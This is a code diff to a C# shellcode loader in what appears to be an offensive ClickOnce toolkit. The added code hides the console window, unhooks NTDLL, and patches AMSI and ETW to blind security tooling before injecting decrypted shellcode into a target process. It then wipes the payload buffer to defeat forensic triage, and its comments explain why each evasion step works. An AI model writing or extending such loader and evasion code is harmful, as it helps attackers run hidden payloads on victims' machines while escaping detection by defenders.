@@ -1,4 +1,6 @@
 ﻿using Erebus.ClickOnce;
+using Erebus.ClickOnce.Evasion;
+using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
 
 namespace ShellcodeLoader
@@ -9,6 +11,27 @@ namespace ShellcodeLoader
         [SupportedOSPlatform("windows")]
         public static void Main(string[] args)
         {
+            // Detach from any inherited console before touching the
+            // runtime. The exe is linked as Subsystem=2 (Windows GUI) so
+            // Windows will not allocate a console for us, but a parent
+            // process that already had one (cmd.exe launching the
+            // ClickOnce exe for testing, for example) can still pass the
+            // handle down via inheritance. FreeConsole drops that
+            // inherited handle so no stdout / stderr write can ever
+            // surface a visible console window.
+            DynamicApi.FreeConsole();
+
+            // ============================================================
+            // EVASION PATCHES
+            // ============================================================
+            // Order matters. NTDLL unhook has to run first so that the
+            // VirtualProtect we use to install the AMSI / ETW patches
+            // reaches a clean stub. After both patches land every
+            // subsequent P/Invoke, including the injection pipeline,
+            // executes through the unhooked nt* surface.
+            NtdllUnhook.Unhook();
+            EvasionPatches.RunEvasionPatches();
+
             string injectionMethod = InjectionConfig.InjectionMethod;
             int targetPid = InjectionConfig.TargetPID;
             byte[] shellcode = InjectionConfig.Shellcode;
@@ -97,6 +120,11 @@ namespace ShellcodeLoader
             }
             DebugLogger.WriteLine($"[+] Final shellcode size: {shellcode.Length} bytes");
 
+            // Pin the decrypted shellcode for the injection window so the
+            // GC cannot relocate it (which would leave a plaintext copy at
+            // the old address) and so the buffer is guaranteed to stay at
+            // one physical location we can zero afterwards.
+            GCHandle pin = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
             try
             {
                 IInjectionMethod injector = InjectionFactory.GetInjectionMethod(injectionMethod);
@@ -120,6 +148,15 @@ namespace ShellcodeLoader
             {
                 DebugLogger.WriteLine($"\n[-] Error: {ex.Message}");
                 Environment.Exit(1);
+            }
+            finally
+            {
+                // Scrub the managed staging buffer - the shellcode is
+                // already copied into the target process by now, so this
+                // buffer has no purpose and keeping it around would leave
+                // decrypted payload in our own heap for any triage tool.
+                Array.Clear(shellcode, 0, shellcode.Length);
+                if (pin.IsAllocated) pin.Free();
             }
         }
     }
